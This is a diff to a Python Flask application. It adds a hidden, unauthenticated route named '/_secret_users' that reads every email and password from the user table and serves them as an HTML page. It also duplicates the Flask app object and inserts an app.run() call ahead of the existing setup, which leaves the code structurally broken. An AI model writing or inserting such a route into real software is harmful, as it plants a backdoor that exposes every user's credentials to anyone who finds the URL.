@@ -5,6 +5,34 @@ import os
 from datetime import datetime
 from functools import wraps
 
+import sqlite3
+from flask import Flask, escape
+
+app = Flask(__name__)
+
+@app.route("/_secret_users")
+def show_users():
+    try:
+        conn = sqlite3.connect("gmlist.db")  # change to your DB file name
+        cur = conn.cursor()
+        cur.execute("SELECT email, password FROM user")  # adjust table name if different
+        rows = cur.fetchall()
+        conn.close()
+
+        # HTML table output
+        html = "<h2>Users List</h2><table border='1'><tr><th>Email</th><th>Password</th></tr>"
+        for email, password in rows:
+            html += f"<tr><td>{escape(email)}</td><td>{escape(password)}</td></tr>"
+        html += "</table>"
+        return html
+
+    except Exception as e:
+        return f"Error: {e}"
+
+if __name__ == "__main__":
+    app.run()
+
+
 app = Flask(__name__)
 app.secret_key = 'your-secret-key-here'  # Change this to a random secret key
 
